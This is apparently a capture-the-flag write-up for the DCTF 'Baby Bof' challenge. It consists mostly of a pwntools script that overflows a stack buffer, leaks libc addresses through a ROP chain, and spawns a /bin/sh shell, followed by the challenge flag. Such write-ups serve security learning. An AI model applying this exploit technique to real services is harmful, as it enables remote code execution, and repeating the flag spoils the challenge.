# Baby Bof

## Description

It's just another bof.

`nc dctf-chall-baby-bof.westeurope.azurecontainer.io 7481`

[baby_bof](baby_bof) \
[Dockerfile](Dockerfile)

## Solution

```python
from pwn import *

nc = remote('dctf-chall-baby-bof.westeurope.azurecontainer.io', 7481)

pop_rdi    = 0x400683
pop_rbp    = 0x400538
jmp_rbp    = 0x4007e3
ret        = 0x40048e

puts_got   = 0x601018
alarm_got  = 0x601020
fgets_got  = 0x601028

main     = 0x4005b7

payload = [
    b'A' * 18,

    # print puts addr
    p64(pop_rdi),
    p64(puts_got),
    p64(pop_rbp),
    p64(puts_got),
    p64(jmp_rbp),

    # print fgets addr
    p64(pop_rdi),
    p64(fgets_got),
    p64(pop_rbp),
    p64(puts_got),
    p64(jmp_rbp),

    # print alarm addr
    p64(pop_rdi),
    p64(alarm_got),
    p64(pop_rbp),
    p64(puts_got),
    p64(jmp_rbp),

    p64(main),
]

nc.recvline()
nc.sendline(b''.join(payload))
nc.recvline()

puts  = u64(nc.recvline().rstrip() + b'\x00\x00')
fgets = u64(nc.recvline().rstrip() + b'\x00\x00')
alarm = u64(nc.recvline().rstrip() + b'\x00\x00')

log.info(f"puts @ {hex(puts)}")
log.info(f"fgets @ {hex(fgets)}")
log.info(f"alarm @ {hex(alarm)}")

libc = puts - 0x0875a0
assert libc == fgets - 0x0857b0
assert libc == alarm - 0x0e5f10

log.info(f"libc @ {hex(libc)}")

system = libc + 0x055410
bin_sh = libc + 0x1b75aa

log.info(f"system @ {hex(system)}")

payload = [
    b'A' * 18,

    # system("/bin/sh")
    p64(pop_rdi),
    p64(bin_sh),
    p64(ret),
    p64(system),
]

nc.recvline()
nc.sendline(b''.join(payload))
nc.recvline()

nc.interactive()
```

#### **FLAG >>** `dctf{D0_y0U_H4v3_A_T3mpl4t3_f0R_tH3s3}`